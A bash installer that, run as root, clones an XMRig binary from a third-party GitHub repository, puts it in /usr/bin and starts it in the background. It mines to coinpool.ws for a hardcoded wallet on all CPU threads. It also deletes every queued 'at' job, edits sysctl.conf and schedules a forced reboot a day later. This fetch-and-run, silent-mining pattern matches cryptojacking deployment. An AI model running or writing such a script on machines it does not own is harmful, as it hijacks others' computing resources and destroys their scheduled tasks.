#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi

WALLET=Q01050036f482ec4ba14548caf6a61e68a3632539ca56ac9782718219a3c3180b884268a5a38812
ID="$(hostname)"
PASSWORD=x
THREADS="$(nproc --all)"

rm -rf /tmp/miner/
for i in `atq | awk '{print $1}'`;do atrm $i;done

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
	sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
	sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
	rm -rf /tmp/miner
cd /tmp && mkdir miner
	git clone https://github.com/loaman123/miner-xmr.git /tmp/miner
cd /tmp/miner
	chmod +x /tmp/miner/xmrig
sleep 1
	cp /tmp/miner/xmrig /usr/bin/
sleep 1
	xmrig -o coinpool.ws:5555 -u $WALLET --pass=$PASSWORD --threads=$THREADS -B -l /tmp/miner/coinpool_qrl.log --donate-level=1 --print-time=10 --variant 1 -k 
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### tail -f /tmp/miner/coinpool_qrl.log \033[0m'

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 24 hours < /tmp/at.txt
echo -e 'Restart job specified'
